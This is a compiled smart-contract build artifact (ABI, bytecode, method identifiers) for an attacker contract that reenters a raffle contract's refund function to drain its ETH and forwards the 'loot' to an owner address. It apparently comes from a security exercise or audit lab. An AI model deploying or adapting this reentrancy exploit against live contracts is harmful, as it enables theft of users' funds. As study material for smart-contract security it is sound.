{"abi":[{"type":"constructor","inputs":[{"name":"raffleAddress","type":"address","internalType":"address"},{"name":"ownerAddress","type":"address","internalType":"address"},{"name":"_drainEdge","type":"uint256","internalType":"uint256"}],"stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"setDrainEdge","inputs":[{"name":"_drainEdge","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"event","name":"AttackStarted","inputs":[],"anonymous":false},{"type":"event","name":"EthReceived","inputs":[{"name":"amount","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"LootWithdrawn","inputs":[{"name":"amount","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"ReentrancyStarted","inputs":[],"anonymous":false}],"bytecode":{"object":"0x60a060405260405161066c38038061066c8339818101604052606081101561002657600080fd5b5080516020820151604090920151606083901b6001600160601b031916608052600080546001600160a01b0319166001600160a01b038416178155919291600160405190808252806020026020018201604052801561008f578160200160208202803683370190505b50905030816000815181106100a057fe5b60200260200101906001600160a01b031690816001600160a01b03168152505060008054906101000a90046001600160a01b03166001600160a01b031663649677e16040518163ffffffff1660e01b815260040160206040518083038186803b15801561010c57600080fd5b505afa158015610120573d6000803e3d6000fd5b505050506040513d602081101561013657600080fd5b505160018190556000805460405163e1a0f7e760e01b81526020600482018181528651602484015286516001600160a01b039094169563e1a0f7e79590948894929384936044019286820192909102908190849084905b838110156101a557818101518382015260200161018d565b50505050905001925050506000604051808303818588803b1580156101c957600080fd5b505af11580156101dd573d6000803e3d6000fd5b50506000546040805163db2cea7560e01b815230600482015290516001600160a01b03909216945063db2cea7593506024808201935060209291829003018186803b15801561022b57600080fd5b505afa15801561023f573d6000803e3d6000fd5b505050506040513d602081101561025557600080fd5b505160025560038290556040517f64bbaf32eb390bd386c9d4d90009bbdc843f6f400f852cf591a4749ff5f4610a90600090a15050505060805160601c6103c36102a96000398061023c52506103c36000f3fe60806040526004361061002d5760003560e01c8063244102891461013c5780639e5faafc1461016657610137565b36610137576040805134815290517f353bcaaf167a6add95a753d39727e3d3beb865129a69a10ed774b0b8996714039181900360200190a160408051808201909152601b81527f5b215d20526166666c652062616c616e6365206c6566743a202564000000000060208201526000546100b091906001600160a01b03163161017b565b6003546000546001600160a01b0316311061012d57600080546002546040805163278ecde160e01b81526004810192909252516001600160a01b039092169263278ecde19260248084019382900301818387803b15801561011057600080fd5b505af1158015610124573d6000803e3d6000fd5b50505050610135565b61013561022d565b005b600080fd5b34801561014857600080fd5b506101356004803603602081101561015f57600080fd5b50356102bc565b34801561017257600080fd5b506101356102c1565b61022982826040516024018080602001838152602001828103825284818151815260200191508051906020019080838360005b838110156101c65781810151838201526020016101ae565b50505050905090810190601f1680156101f35780820380516001836020036101000a031916815260200191505b5060408051601f198184030181529190526020810180516001600160e01b03166309710a9d60e41b179052935061034f92505050565b5050565b60405147906001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000169082156108fc029083906000818181858888f19350505050158015610285573d6000803e3d6000fd5b506040805182815290517fda99fc855f3b7429eccee4147a58c05d64c5fa1bb47d52ce2605f36cbeba890c9181900360200190a150565b600355565b6040517f7a4f765abe14ab4c23e119b6f0510ed6f6c8de40b7a6cbcedc9f912148ac1a5490600090a1600080546002546040805163278ecde160e01b81526004810192909252516001600160a01b039092169263278ecde19260248084019382900301818387803b15801561033557600080fd5b505af1158015610349573d6000803e3d6000fd5b50505050565b6103668161035e61036961038a565b63ffffffff16565b50565b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b9056fea26469706673582212204ddf2481bdb18620c7037e99e2d05ae49b87865df3515b73dd250208a69187bc64736f6c63430007060033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","setDrainEdge(uint256)":"24410289"},"id":41}